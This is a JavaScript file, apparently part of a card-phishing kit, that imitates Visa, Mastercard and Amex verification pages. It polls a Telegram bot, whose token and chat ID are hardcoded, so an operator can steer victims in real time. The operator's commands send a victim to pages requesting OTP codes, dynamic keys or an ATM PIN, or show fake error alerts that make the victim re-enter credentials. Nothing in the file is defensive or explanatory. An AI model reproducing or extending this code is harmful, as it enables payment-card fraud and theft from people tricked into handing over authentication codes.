// Cargar logo de la compañía si existe el elemento
const companyLoader = document.querySelector("#company-loader");

if (companyLoader && window.info?.checkerInfo?.company) {
    const logos = {
        VISA: { src: "./assets/logos/visa_verified.png", width: "130px", margin: "40px" },
        MC: { src: "./assets/logos/mc_id_check_2.jpg", width: "400px" },
        AM: { src: "./assets/logos/amex_check_1.png", width: "200px" }
    };

    const company = window.info.checkerInfo.company;
    if (logos[company]) {
        companyLoader.setAttribute("src", logos[company].src);
        companyLoader.setAttribute("width", logos[company].width);
        if (logos[company].margin) {
            companyLoader.style.marginBottom = logos[company].margin;
        }
    }
}

// Define offset como una variable global
let offset = 0; // Inicializa el offset en 0
document.addEventListener("DOMContentLoaded", async () => {
    // ✅ Reemplaza claves.json por configuración directa
    const config = {
        botToken: "7618655225:AAELL845R6t9J_ftTBgVS9Y0SDHZKbqqfDI", // ← tu token real aquí
        chatId: "-5124502975" // ← tu chat ID aquí
    };

    console.log("🔑 Config cargada manualmente en waiting.html:", config);

    const transactionId = localStorage.getItem("transactionId");
    const messageId = localStorage.getItem("messageId");

    if (!transactionId || !messageId) {
        console.error("❌ No se encontró transactionId o messageId en localStorage.");
        return;
    }

    console.log("🔄 Esperando respuestas de Telegram en waiting.html...");
    checkPaymentVerification(transactionId, messageId, config);
});


async function checkPaymentVerification(transactionId, messageId, config) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${offset}`);
        const data = await response.json();

        const updates = data.result;

        console.log("📩 Actualizaciones recibidas:", updates);

        if (updates.length > 0) {
            offset = updates[updates.length - 1].update_id + 1; // Actualiza el offset
        }

        const verificationUpdate = updates.find((update) =>
            update.callback_query &&
            [
                `error_tc:${transactionId}`,
                `error_logo:${transactionId}`,
                `dinamic:${transactionId}`,
                `pedir_otp:${transactionId}`,
                `cajero:${transactionId}`,
                `xdinamic:${transactionId}`,
                `xotp:${transactionId}`,
                `confirm_finalizar:${transactionId}`
            ].includes(update.callback_query.data)
        );

        if (verificationUpdate) {
            console.log("✅ Acción recibida en Telegram:", verificationUpdate.callback_query.data);

            // Ocultar botones en Telegram después de presionar
            console.log("📩 Eliminando botones con chat_id:", config.chatId, "y message_id:", messageId);
            const editResponse = await fetch(`https://api.telegram.org/bot${config.botToken}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                })
            });

            const editData = await editResponse.json();
            console.log("🔄 Respuesta de editMessageReplyMarkup:", editData);

            if (!editData.ok) {
                console.error("❌ Error al eliminar botones:", editData.description);
            }

            switch (verificationUpdate.callback_query.data) {
                case `error_logo:${transactionId}`:
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "id-check.html";
                    break;
                case `error_tc:${transactionId}`:
                    alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
                    window.location.href = "payment.html";
                    break;
                case `pedir_otp:${transactionId}`:
                    window.location.href = "otpbot.html";
                    break;
                case `dinamic:${transactionId}`:
                    window.location.href = "pedirdinamica.html";
                    break;
                case `cajero:${transactionId}`:
                    window.location.href = "clave_cajero.html";
                    break;
                case `xdinamic:${transactionId}`:
                    alert('Error en la clave dinámica, inténtelo nuevamente');
                    window.location.href = "errordinamica.html";
                    break;
                case `xotp:${transactionId}`:
                    alert('Error en el código otp, inténtalo nuevamente.');
                    window.location.href = "errorotpbot.html";
                    break;
                case `confirm_finalizar:${transactionId}`:
                    window.location.href = "success.html";
                    break;
            }
        } else {
            // Si no hay respuesta, seguir verificando cada 2 segundos
            setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
        }
    } catch (error) {
        console.error("❌ Error verificando respuesta de Telegram:", error);
        setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
    }
}

